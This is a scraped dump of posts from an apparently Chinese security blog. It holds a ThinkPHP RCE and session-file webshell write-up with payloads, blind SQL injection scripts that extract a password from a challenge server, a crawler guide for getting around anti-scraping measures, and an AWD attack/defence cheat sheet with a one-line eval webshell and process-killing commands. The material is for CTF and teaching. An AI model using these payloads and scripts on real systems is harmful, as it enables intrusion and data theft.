执行应用并响应Container::get('app')-&gt;run()-&gt;send(); 利用 12http://127.0.0.1/tp5117/public/index.phppost:c=system&amp;f=calc.exe&amp;_method=filter thinkphp6.0.0-6.0.1 任意文件操作利用条件: ThinkPHP6.0.0-6.0.1 开启Sessoin中间件 漏洞复现官方commit: https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2 复现环境为:phpstudy+thinkphp6.0.1 \\app\\controller\\index.php: 1234567891011121314&lt;?phpnamespace app\\controller;use app\\BaseController;use think\\facade\\Session;class Index extends BaseController&#123; public function index($name) &#123; Session::set('name', $name); return 'hello,' . Session::get('name');; &#125;&#125; \\app\\middleware.php 12345678910&lt;?php// 全局中间件定义文件return [ // 全局请求缓存 // \\think\\middleware\\CheckRequestCache::class, // 多语言加载 // \\think\\middleware\\LoadLangPack::class,// Session初始化 \\think\\middleware\\SessionInit::class]; payload 1.正常注册一个账号 2.登陆时更改sessid为.php结尾(满足长度32位) 3.用相同的cookie向home/member/searchPOST一句话 4.在/runtime/session/中找到我们的马 123http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3ECookie :PHPSESSID=9f7777c08f3909751b148338ba08.php#更改sessid为.php结尾(满足长度32位) 访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php补丁分析 vendor/topthink/framework/src/think/session/Store.php 在setId中增加了对$id的校验:ctype_alnum($id),只允许数字或字母,来避免任意文件操作参考文章ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析thinkphp v5.1反序列化链pocThinkphp5代码执行学习ThinkPHP 的历史漏洞分析ThinkPHP6 任意文件操作漏洞分析ThinkPHP6 任意文件操作漏洞分析","categories":[],"tags":[]},{"title":"sql盲注效率分析","slug":"sql盲注效率分析","date":"2020-12-14T09:30:47.000Z","updated":"2020-12-27T03:42:33.737Z","comments":true,"path":"article/88d97774.html","link":"","permalink":"https://blog.cfyqy.com/article/88d97774.html","excerpt":"首发于先知社区https://xz.aliyun.com/t/7575","text":"首发于先知社区https://xz.aliyun.com/t/7575 一、概述sql盲注是sql注入的一种，它不会根据你的sql注入语句来返回你想要知道的错误信息。 盲注可分为两种: 布尔盲注: 根据注入语句返回Ture和False 时间盲注: 界面的返回值只有True.加入特定的时间函数，查看web页面返回的时间差来判断注入语句的正确性。 因为数据库里的信息无法通过错误信息得到，所以只能通过盲注爆破猜解一个个字符值。常见的猜解方法有三种: 遍历法 二分法 与运算 二、方法介绍1.遍历法通过遍历可打印字符串0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&#39;#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_{|}~来猜解正确的字符值 1234567def traversing(char): chars=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_&#123;|&#125;~\" for i in chars: if i==char: print(i) return traversing('t') 效率分析: T(n)=(n+1)/2,这里的n为可打印字符串的长度，这里n为91，则确定一个字符值的大小平均要比较运算46次 2.二分法可打印字符的 ASCII码的值范围大概在0x20和0x7f区间内。 (1)首先取区间的中间值mid跟目标元素的ascii码值对比，如果相等则结束搜索。(2)如果目标元素的ascii码值小于mid,则在小于mid的区间内查找，否则在大于mid的区间查找，重复(1)(3)如果找不到则退出 12345678910111213def binary(char): left=0x20 right=0x7f while 1: mid=left+(right-left)//2 if left==mid: print(chr(mid) return if mid&gt;ord(char): right=mid else: left=midbinary('t') 效率分析: T(n)=log2 n,n=0x7f-0x20=95,则确定一个字符平均比较次数为6.6次。 3.与运算运算规则： 0 &amp; 0 = 00 &amp; 1 = 01 &amp; 0 = 01 &amp; 1 = 1 即：两位同时为“1”，结果才为“1”，否则为0 一个byte有8bit，假设8bit的低位到高位的值a、b、c、d、e、f、g、h，并且其值只能为0,1两种，其值大小为a*2^0+b*2^1+c*2^2+d*2^3+e*2^4+f*2^5+g*2^6+h*2^7。所以我们只要将其值大小分别于1,2,4,8,16,32,64,128进行与运算，就能够确定每bit位的值，从而猜出其值大小。对于可打印字符的值小于127，最高bit为为0，所以只要比较7次就行了。 1234567def and_operation(char): sum=0 for i in range(7): if ord(char)&amp;2**i: sum=sum+2**i print(chr(sum))andOperation('t') 效率分析: T(n)=7,一个字符值大小需要比较7次确认。 从上面的效率分析中，遍历法需要平均比较46次，二分法需要平均比较6.6次，与运算需要7次，因为http请求的时间开销会相对大，因此http请求次数越少，花费的时间会越少，所以sql盲注的效率大小为 二分法&gt;=与运算&gt; 遍历法 三、盲注实例这里拿HFSEC平台的一道sql盲注，分别用三种不同的解法来对比一下效率 遍历法 1234567891011121314151617181920212223242526272829303132import requestsimport timefrom functools import wrapsdef spend_time(func): @wraps(func) def wrapper(*agrs,**kwargs): startTime=time.time() func(*agrs,**kwargs) endTime=time.time() sumTime=endTime-startTime print(\"spend time:\",sumTime) return wrapper@spend_timedef traversing(): url=\"http://111.230.11.183:44444/basic_skills/sql/sql3.php\" chars=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_&#123;|&#125;~\" flag_payload= \"a' or 1 and ascii(substr((select password from user limit 0,1),&#123;0&#125;,1))=&#123;1&#125; -- \" info=\"\" for i in range(33): for char in chars: payload=flag_payload.format(i,ord(char)) data=&#123; \"username\": payload, \"password\":\"ye1s\" &#125; rep=requests.post(url=url,data=data,allow_redirects=False) if rep.status_code==302: info=info+char print(info)if __name__==\"__main__\": traversing() 运算结果 1240356E66E78BB1DC1EFBC04FA4336F59spend time: 207.9748649597168 二分法 123456789101112131415161718192021222324252627282930313233343536373839import requestsimport timefrom functools import wrapsdef spend_time(func): @wraps(func) def wrapper(*agrs,**kwargs): startTime=time.time() func(*agrs,**kwargs) endTime=time.time() sumTime=endTime-startTime print(\"spend time:\",sumTime) return wrapper@spend_timedef binary(): url=\"http://111.230.11.183:44444/basic_skills/sql/sql3.php\" flag_payload= \"a' or 1 and ascii(substr((select password from user limit 0,1),&#123;0&#125;,1))&lt;&#123;1&#125; -- \" info=\"\" for i in range(1,33): left=0x2 right=0x7f while 1: mid=left+(right-left)//2 if mid==left: info=info+chr(mid) print(info) break payload=flag_payload.format(i,mid) data=&#123; \"username\": payload, \"password\":\"ye1s\" &#125; rep=requests.post(url=url,data=data,allow_redirects=False) if rep.status_code==302: right=mid else: left=midif __name__==\"__main__\": binary() 运行结果 1240356E66E78BB1DC1EFBC04FA4336F59spend time: 14.131437301635742 与运算 123456789101112131415161718192021222324252627282930313233343536import requestsimport timefrom functools import wrapsdef spend_time(func): @wraps(func) def wrapper(*agrs,**kwargs): startTime=time.time() func(*agrs,**kwargs) endTime=time.time() sumTime=endTime-startTime print(\"spend time:\",sumTime) return wrapper @spend_timedef and_operation(): url=\"http://111.230.11.183:44444/basic_skills/sql/sql3.php\" flag_payload= \"a' or 1 and ascii(substr((select password from user limit 0,1),&#123;0&#125;,1))&amp;&#123;1&#125; -- \" info=\"\" for j in range(1,33): value=0 for k in range(7): payload=flag_payload.format(j,2**k) data=&#123; \"username\": payload, \"password\":\"ye1s\" &#125; rep=requests.post(url=url,data=data,allow_redirects=False) if rep.status_code==302: value=value+(2**k) if value==0: break info=info+chr(value) print(info)if __name__==\"__main__\": and_operation() 运算结果 1240356E66E78BB1DC1EFBC04FA4336F59spend time: 15.214633703231812 从三种的不同解法的运算结果时间来看，遍历法花费了207秒、二分法花费了14秒，与运算花费了15秒。花费的时间还会受到网速和其他因素的影响，不是每次运行都会花费相同的时间，但总的结果来说，遍历法花费的时间很多，二分法和与运算花费的时间比较少。 所以在遇到sql盲注时，建议用二分法和与运算来猜解。","categories":[],"tags":[],"author":"ye1s"},{"title":"浅谈信安文章搜索引擎","slug":"浅谈信安文章搜索引擎","date":"2020-12-04T12:52:24.000Z","updated":"2020-12-27T03:32:54.321Z","comments":true,"path":"article/f76a9d38.html","link":"","permalink":"https://blog.cfyqy.com/article/f76a9d38.html","excerpt":"一个搜索引擎的实现流程大概为：首先获取海量的数据，整理成统一的格式，然后交给索引程序建立索引，当索引建立好后，就可以进行搜索。简而言之就是：数据获取-&gt;数据检索-&gt;数据搜索","text":"一个搜索引擎的实现流程大概为：首先获取海量的数据，整理成统一的格式，然后交给索引程序建立索引，当索引建立好后，就可以进行搜索。简而言之就是：数据获取-&gt;数据检索-&gt;数据搜索 0x1数据获取数据获取大概有如下两种： 爬虫定期获取：根据网站特征，写爬虫规则，定期获取想要的文章数据 网站主动推送：网站拥有者主动向搜索引擎提交文章数据 搜索引擎的初期数据获取一般只能采取爬虫定期获取，当搜索引擎比较普遍使用(如谷歌、百度等)，才会有很多网站拥有者主动推送。 0x1.1爬取站点信息安全文章的站点，可以分为三类 安全社区：先知社区、安全客、嘶吼、freebuf、安全脉搏、91ri、看雪论坛、乌云知识库等 创作社区：博客园、csdn、简书、知乎、腾讯云社区等 个人博客：hexo主题博客、wordpress博客等 0x1.2爬取方式在爬取之前，先弄清一下爬取的需求，每篇文章需要获取发布日期、作者、标题、正文内容、文章链接、网站域名。接着对文章重复的判断，这里主要是根据文章链接的唯一性来判断是否重复，当然有的文章可能会在多处发表，存在一小部分的重复文章，最后根据每个网站特点，写定制化爬虫。 爬取的方式可以分为两种，一种是根据网站页面特征来爬取，一种是请求数据接口来爬取。本次爬虫使用的 python 的 Scrapy 框架来演示。 0x1.2.1 网页特征通过观察 HTML 页面，先确定一下要爬取信息所在的位置，然后看一下该位置所处的 DOM 路径、标签元素、属性元素，找到能准确获取该信息的方式。以 hexo 的 next 主题博客为例，这个主题还是挺多师傅使用的。 爬取思路：(1). 爬取当前页面的所有文章链接(2). 对页面中的每个文章链接进行爬取,得到文章相关信息(3). 当前页面爬取完后，获取“下一页”,再从步骤(1)爬取 获取链接获取文章信息得到下一页面 在Scrapy 中可以使用 Scrapy shell 调试 1scrapy shell article_url Scrapy中的Spider代码如下 1234567891011121314151617181920212223242526272829303132import scrapyfrom urllib import parsefrom crawlersec.items import CrawlersecItemfrom crawlersec.util import html_entityclass SiHouSpider(scrapy.Spider): name=\"hexo_next\" start_urls = [\"https://chybeta.github.io/\"] def parse(self, response): urls=response.xpath(\"//a[@class='post-title-link']/@href\").extract()#得到页面的所有文章链接 for i in range(len(urls)): absolute_url=parse.urljoin(response.url,urls[i]) yield scrapy.Request(url=absolute_url, callback=self.parse_text) next_page=response.xpath(\"//a[@class='extend next']/@href\").extract_first() if next_page:#获取下一页页面 absolute_url = parse.urljoin(response.url, next_page) yield scrapy.Request(url=absolute_url, callback=self.parse) def parse_text(self,response):#获取文章的相关信息 item=CrawlersecItem() item['url']=response.url item['title']=html_entity(response.css(\".post-title::text\").extract_first().strip()) item['author']=get_author_by_url(response.url) item['date']=response.xpath(\"//time/text()\").extract_first().strip() content=\"\" for text in response.xpath(\"//div[@class='post-body']//text()\").extract(): content +=\"\".join(text.split()) content=html_entity(content) item['content']=content item['domain']=list(parse.urlparse(response.url))[1] yield itemdef get_author_by_url(url): authors = &#123;\"chybeta.github.io\": \"chybeta\"&#125; return authors[list(parse.urlparse(url))[1]] 0x1.2.2 数据接口有些站点的文章信息是从数据接口请求而来，刚好可以直接请求数据接口获取文章的信息。例如安全客的文章： 安全客的网站结构是相对比较复杂，但点击加载更多，发现文章信息是通过请求数据接口得来的。数据接口为 1https://api.anquanke.com/data/v1/posts?size=20&amp;page=1 爬取思路为：(1).首先获取当前数据分页中每条数据文章标题、文章id、发布日期、作者(2).将获取的文章id，都加上https://www.anquanke.com/post/id/，得到文章链接，请求文章链接获取正文内容(3).获取下一数据分页，重复步骤(1) Scrapy中的Spider代码如下 1234567891011121314151617181920212223242526272829303132333435import scrapyfrom urllib import parseimport simplejsonfrom crawlersec.items import CrawlersecItemfrom crawlersec.util import html_entityclass AnquankeSpider(scrapy.Spider): name=\"anquanke\" allowed_domains=[\"anquanke.com\"] base_url=\"https://www.anquanke.com/\" start_urls=[\"https://api.anquanke.com/data/v1/posts?size=20\"] def parse(self,response): prefix_url=\"https://www.anquanke.com/post/id/\" res=simplejson.loads(response.text) posts=res['data'] for post in posts: item=CrawlersecItem() item['author']=post['author']['nickname'] item['date']=post['date'] item['title'] = post['title'] url=prefix_url+str(post['id']) item['url']=url item['domain']=list(parse.urlparse(self.base_url))[1] yield scrapy.Request(url=url,meta=&#123;'article_item':item&#125;,callback=self.parse_text) next_url=res['next'] if next_url: yield scrapy.Request(url=next_url,callback=self.parse) def parse_text(self,response): item=response.meta.get('article_item','') content=\"\" for text in response.xpath(\"//text()\").extract(): content +=\"\".join(text.split()) content=html_entity(content)#HTML entity encoding item['content']=content print(item['content']) yield item 0x1.3 反爬策略绕过0x1.3.1 User-Agent反爬策略：网站在处理反爬的过程中，很常见的一种方式就是通过检测 User-agent 来拒绝非浏览器的访问。 绕过方式：可以维护一个 User-agent 组合列表，在发送请求时随机从列表中抽取一个，放入 Headers 请求头部里。 可以在 Scrapy 的 middlewares.py 中自定义 RandomUserAgentMiddleware 类，并作为Download Middleware 启用。Download Middware 是引擎和下载器的中间件，每个 Request 在爬取之前都会调用其中开启的类，从而对 Request 进行一定的处理，在这里对每个请求加上随机的User-Agent 12345class RandomUserAgentMiddleware(object): def process_request(self, request, spider): rand_use = random.choice(USER_AGENT_LIST) if rand_use: request.headers.setdefault('User-Agent', rand_use) 在 Scrapy 的 setting.py 中定义 USER_AGENT_LIST 1234567891011121314151617181920USER_AGENT_LIST=[ \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\", \"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6\", \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6\", \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1\", \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5\", \"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)\", \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3\", \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24\", \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24\"] 在 setting.py 的 Download Middware 参数配置中添加定义的类 12345DOWNLOADER_MIDDLEWARES = &#123; 'crawlersec.middlewares.CrawlersecDownloaderMiddleware': 543, 'crawlersec.middlewares.RandomUserAgentMiddleware': 400, &#125; 0x1.3.2 IP限制反爬策略：同一 IP 访问网站过于频繁，就会对该 IP 进行限制，短时间内无法访问。绕过方式：1.维护一个 IP 代理池，每次请求随机使用 一个 IP 代理2.调小爬虫的线程并发数，或每次请求后，设置一个短时间暂停 这里就从一些免费的站点中获取一些 IP,并保存在 proxies.py 文件中如 www.xiladaili.com 站点 12345678910111213141516171819202122232425262728import scrapyimport requestsclass SeeBugSpider(scrapy.Spider): name=\"proxy\" allowed_domains=[\"www.xiladaili.com\"] base_url=\"http://www.xiladaili.com/\" def start_requests(self): tmp_url=\"http://www.xiladaili.com/gaoni/&#123;&#125;/\" f = open('proxies.txt', \"r+\") f.truncate() for i in range(2,200):#数字可查看官网链接 yield scrapy.Request(url=tmp_url.format(i),callback=self.parse) def parse(self,response): proxy_list=response.xpath(\"//tbody//tr/td/text()\").extract() for i in range(0,len(proxy_list),8): self.verify_one_proxy(proxy_list[i+1],proxy_list[i]) def verify_one_proxy(self,protocol,url): schema = 'https' if 'https' in protocol else 'http' proxies = &#123;schema: url&#125; print(proxies) try: if requests.get('https://www.baidu.com/', proxies=proxies, timeout=2).status_code == 200: with open('./proxies.txt', 'a+',encoding='utf-8') as f: f.write(schema+\"://\"+url+\"\\n\") except: pass 在 Scrapy 的 middlewares.py 中定义一个 ProxyMiddleWare 类 123456789101112131415161718192021222324252627282930class ProxyMiddleWare(object): \"\"\"docstring for ProxyMiddleWare\"\"\" def process_request(self, request, spider): '''对request对象加上proxy''' proxy = self.get_random_proxy() print(\"this is request ip:\" + proxy) request.meta['proxy'] = proxy def process_response(self, request, response, spider): '''对返回的response处理''' # 如果返回的response状态不是200,重新生成当前request对象 if response.status != 200: proxy = self.get_random_proxy() print(\"this is response ip:\" + proxy) # 对当前request加上代理 request.meta['proxy'] = proxy return request return response def get_random_proxy(self): '''随机从文件中读取proxy''' while 1: with open('./proxies.txt', 'r') as f: proxies = f.readlines() if proxies: break else: pass #time.sleep(1) proxy = random.choice(proxies).strip() return proxy 在 setting.py 的 Download Middware 参数中添加配置的类 12345DOWNLOADER_MIDDLEWARES = &#123; 'crawlersec.middlewares.CrawlersecDownloaderMiddleware': 543, 'crawlersec.middlewares.ProxyMiddleWare': 540,&#125; 0x1.3.3 Cookie反爬策略：文章需要登录后才能访问绕过方法：1.手动登录获取 Cookie,将 Cookie 添加到爬虫脚本中2.模拟登录 0x1.3.4 Header反爬策略：网站的文章需要带特定的头部请求才能允许访问,如Referer等绕过方法： 每次请求中添加需要的头部例如： 12345headers=&#123; \"X-Requested-With\":\"XMLHttpRequest\", \"Referer\": \"https://www.kanxue.com/\" &#125; yield scrapy.FormRequest(url=url,formdata=data,headers=headers,callback=self.parse) 0x2.数据检索当数据爬取后，对数据建立倒排索引，方便我们快速搜索 0x2.1 倒排索引倒排索引也称全文索引，检索程序对文章的每一个词建立一个索引，指明该词在文章中出现的次数和位置，当用户查询时，检索程序就根据事先建立的索引进行查找，并将查找的结果反馈给用户的检索方式。这个过程类似于通过字典中的检索字表查字的过程。 例如有两篇文章：文章1内容：it is sunny today文章2内容：today is rainy 1.首先取得关键字文章1关键字：[it] [is] [sunny] [today]文章2关键字：[today] [is] [rainy]2.建立倒排索引有了关键词后，就可以建立倒排索引了。上面的对应关系是：“文章号”对“文章中所有关键词”。倒排索引把这个关系倒过来，变成: “关键词”对“拥有该关键词的所有文章号”。 关键词 文章号 it 1 is 1,2 sunny 1 today 1,2 rainy 2 通常仅知道关键词在哪些文章中出现还不够，我们还需要知道关键词在文章中出现次数和出现的位置 关键词 文章号[出现频率] 出现位置 it 1[1] 1 is 1[1] 2 is 2[1] 2 sunny 1[1] 3 today 1[1] 4 today 2[1] 1 rainy 2[1] 3 实现时，将上面三列分别作为词典文件（Term Dictionary）、频率文件(frequencies)、位置文件 (positions)保存。其中词典文件不仅保存有每个关键词，还保留了指向频率文件和位置文件的指针，通过指针可以找到该关键字的频率信息和位置信息。 0x2.2 elasticsearch数据检索这里借助了 Elasticsearch。Elasticsearch的 Mapping 提供了对 Elasticsearch 中索引字段名及其数据类型的定义，还可以对某些字段添加特殊属性：该字段是否分词，是否存储，使用什么样的分词器等。 常用的数据类型(type)有：string、text、date等Elaticsearch 的 mapping 样例如下，对文章链接、标题、作者、发布日期、正文内容、网站域名这六个字段指定检索方式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354mappings = &#123; \"mappings\": &#123; \"properties\": &#123; \"url\": &#123; \"type\": \"keyword\" &#125;, \"title\": &#123; \"type\": \"text\", \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_max_word\", \"fields\": &#123; \"keyword\": &#123; \"type\": \"keyword\", \"ignore_above\": 256 &#125; &#125; &#125;, \"author\": &#123; \"type\": \"text\", \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_max_word\", \"fields\": &#123; \"keyword\": &#123; \"type\": \"keyword\", \"ignore_above\": 256 &#125; &#125; &#125;, \"date\": &#123; \"type\": \"date\", \"format\": \"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis\" &#125;, \"content\": &#123; \"type\": \"text\", \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_max_word\" &#125;, \"domain\": &#123; \"type\": \"text\", \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_max_word\", \"fields\": &#123; \"keyword\": &#123; \"type\": \"keyword\", \"ignore_above\": 256 &#125; &#125; &#125; &#125; &#125; &#125; 0x3.数据搜索对数据检索完后，就可以搜索，然而如果搜索结果有一千个，甚至成千上万个呢？哪个又是您最想要的文章？ 打开 google ,搜索 “web安全”，返回 518000000 条结果，好大的一个数字，在众多的搜索结果中，如何将最相关的放在最前面？ 先简单了解一下数据搜索的过程：1.搜索字符串分词对输入的 “web安全”进行分词：web 、安全、安、全2.搜索字符串和文档的相关性计算首先，一个文档有很多词(Term)组成，如web、安全、安、全、等。其次对于文档之间的关系，不同的 Term 重要性不同，比如对于本篇文档，“web、安全”就相对重要一些，“的、地、可”可能相对不重要一些。所以如果两篇文档都包含“web、安全”，这两篇文档的相关性好一些，然而就算一篇文档包含“的、地、可”，另一篇文档不包含“的、地、可”，也不能影响两篇文档的相关性。 因而判断文档之间的关系，首先找出哪些词(Term)对文档之间的关系最重要，如“web、安全”,然后判断这些词(Term)之间的关系。 找出词(Term)对文档的重要性的过程称为计算词的权重(Term weight)的过程。计算词的权重(Term weight)有两个参数，第一个是词(Term)，第二个是文档(Document)判断词(Term)之间的关系从而得到文档相关性的过程应用一种叫做向量空间模型的算法(Vector Space Model)。 （1）计算权重影响一个词(Term)在一篇文档中的重要性主要有两个因素： Term Frequency (tf)：即此Term在此文档中出现了多少次。tf 越大说明越重要。 Document Frequency (df)：即有多少文档包含次Term。df 越大说明越不重要。 词(Term)在文档中出现的次数越多，说明此词(Term)对该文档越重要，如“web”这个词，在本文档中出现的次数很多，说明本文档主要就是讲这方面的事的。然而在一篇文档中，“的”出现的次数更多，就说明越重要吗？不是的，这是由第二个因素进行调整，第二个因素说明，有越多的文档包含此词(Term), 说明此词(Term)太普通，不足以区分这些文档，因而重要性越低。权重计算公式如下：（2）向量空间模型的算法(VSM)我们把文档看作一系列词(Term)，每一个词(Term)都有一个权重(Term weight)，不同的词(Term)根据自己在文档中的权重来影响文档相关性的打分计算。于是我们把所有此文档中词(term)的权重(term weight) 看作一个向量。Document = {term1, term2, …… ,term N}Document Vector = {weight1, weight2, …… ,weight N}同样我们把查询语句看作一个简单的文档，也用向量来表示。Query = {term1, term 2, …… , term N}Query Vector = {weight1, weight2, …… , weight N}我们把所有搜索出的文档向量及查询向量放到一个N维空间中，每个词(term)是一维。 如图： 我们认为两个向量之间的夹角越小，相关性越大。 所以我们计算夹角的余弦值作为相关性的打分，夹角越小，余弦值越大，打分越高，相关性越大。相关性打分公式如下： 0x4 系统展示最终项目地址：http://secsea.cfyqy.com/ 。写得有点简洁，莫喷。1.web界面显示最近一周的实时文章和相关资讯显示收录文章数量比较多的站点2.搜索功能提供了正文内容搜索、标题搜索、作者搜索、时间搜索、站点数据搜索功能。 默认使用的是正文内容搜索只想要某个站点的数据，并显示最近一年的 参考文章：倒排索引原理和实现: https://www.cnblogs.com/binyue/p/3380750.html全文检索的基本原理：https://www.cnblogs.com/forfuture1978/archive/2009/12/14/1623594.html","categories":[],"tags":[]},{"title":"AWD攻防技巧","slug":"AWD攻防技巧","date":"2020-10-27T16:21:00.000Z","updated":"2021-05-18T14:37:09.922Z","comments":true,"path":"article/64465197.html","link":"","permalink":"https://blog.cfyqy.com/article/64465197.html","excerpt":"AWD的攻防思路和脚本整理","text":"AWD的攻防思路和脚本整理 防护备份备份好处： 别⼈直接把源码给你删了或者删库，可直接备份过去，防⽌down机被扣分 快速寻找发现漏洞，或者⽤D盾、360、⽕绒等扫，看看有没预留后⻔ 当你被种⻢以后，找不到⻢的位置，或者⻢被插⼊某个⽂件，可重新下载⽂件和初始版本进⾏对⽐（beyond compare），看看差别 网站源码连接ssh( 常⻅⼯具mobaXterm，xtfp，finalshell) 1ssh -p ssh_port username@host_ip 修改ssh密码 1passwd 网站源码压缩 12cd /var/www/html tar -zcvf /tmp/xxx.tar.gz ./* 下载到本地 1scp -P ssh_port ctf@host_ip:/tmp/xxx.tar.gz local_file 数据库数据库的账户密码,可在网站配置文件如 config.php 里寻找数据库登录 12mysql –pdb_user –udb_passwd mysql&gt;show databases; 备份指定数据库， 1mysqldump -udb_user -pdb_passwd db_name &gt; /tmp/bak.sql 备份所有数据库 1mysql -udb_user -pdb_passwd --all-databases&lt; back.sql 下载到本地 1scp -P ssh_port ctf@host_ip:/tmp/bak.sql local_file 恢复网站源码本地备份上传到靶机，/tmp目录下的文件如果没有被删除，这步就不用 1scp -P local_file ssh_port ctf@host_ip:/tmp/xxx.tar.gz 源码解压 1tar -zxvf /tmp/xxx.tar.gz /var/www/html/* 数据库1234567数据库登录：mysql -udb_user -pdb_passwd 创建数据库：mysql&gt;create database db_name;source 还原：mysql&gt;use db_name; mysql&gt;source /tmp/bak.sqlmysql 还原：mysql -udb_user -pdb_passwd db_name&lt; /tmp/bak.sql WAF一些WAF工具https://github.com/dycsy/awd-watchbirdhttps://github.com/edwardchoijc/ctf-toolkit/tree/master/Linux/WAFhttps://github.com/DasSecurity-Labs/AoiAWD 文件监控寻找最近20分钟修改的文件 1find /var/www/html -name *.php -mmin -20 杀不死马 建立一个和不死马一样名字的文件夹，这样不死马就写不进去了。完全杀死不死马，得清理内存。 1rm -rf .2.php | mkdir .2.php 杀进程得在root或者www-data权限下。如上传一句话，然后执行 system(‘kill -9 -1’); 杀死所有进程，再手动删除木马 12shell.php: &lt;?php @eval($_GET['9415']); ?&gt;url访问：shell.php?9415=system('kill -9 -1'); 用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值.top 查看占用率最高的cpu进程q 退出M 根据驻留内存大小进行排序P 根据CPU使用百分比大小进行排序 1234567&lt;?php while (1) &#123; $pid = 不死⻢的进程PID; @unlink(\"c.php\"); exec(\"kill -9 $pid\"); usleep(1000); &#125;?&gt; 重启 apache，php 等web服务（一般不会有权限） 流量日志通过对流量、⽇志的分析，可以： 感知可能正在发⽣的攻击，从⽽规避存在的安全⻛险 应急响应，还原攻击者的攻击路径，从⽽挽回已经造成的损失 某些情况下还能对攻击进⾏重放复现 流量流量监控日志：https://github.com/wupco/webloggerhttps://github.com/DasSecurity-Labs/AoiAWD批量包含文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpfunction install($dir,$filename)&#123; $layer_list = scandir($dir); foreach ($layer_list as $i)&#123; if ($i === '.' || $i === \"..\") &#123; continue; &#125; $next = $dir . $i; if (is_dir($next)) &#123; if ($next[strlen($next) - 1] !== '/') &#123; $next .= \"/\"; &#125; install($next,$filename); &#125; else &#123; $ext = end(explode('.', $next)); $php_ext = [\"php\", \"php5\", \"phtml\"]; if (in_array($ext, $php_ext) &amp;&amp; strlen($ext) !== strlen($next)&amp;&amp; $next!=__FILE__) &#123; $old_file_str = file_get_contents($next); file_put_contents($next, \"&lt;?php include_once '\".$filename.\"'; ?&gt;\" . $old_file_str); &#125; &#125; &#125; &#125;function uninstall($dir,$filename)&#123; $layer_list = scandir($dir); foreach ($layer_list as $i) &#123; if ($i === '.' || $i == \"..\") &#123; continue; &#125; $next = $dir . $i; if (is_dir($next)) &#123; if ($next[strlen($next) - 1] !== '/') &#123; $next .= \"/\"; &#125; uninstall($next,$filename); &#125; else &#123; $ext = end(explode('.', $next)); $php_ext = [\"php\", \"php5\", \"phtml\"]; if (in_array($ext, $php_ext) &amp;&amp; strlen($ext) !== strlen($next)&amp;&amp; $next!=__FILE__) &#123; $old_file_str = file_get_contents($next); echo $next . \"\\n\"; file_put_contents($next, str_replace(\"&lt;?php include_once '\".$filename.\"'; ?&gt;\", \"\", $old_file_str)); &#125; &#125; &#125;&#125;if (isset($argv[1]) &amp;&amp; $argv[1] === \"--install\") &#123; if (!isset($argv[2])) &#123; die(\"Usage: php fileinclude.php --install [web dir] [incoude file]\\n Example: php fileinclude.php--install /var/www/html /tmp/filename.php\"); &#125; $install_path = $argv[2]; $include_file = $argv[3]; if ($install_path[strlen($install_path) - 1] !== '/') &#123; $install_path .= \"/\"; &#125; install($install_path,$include_file); die();&#125;if 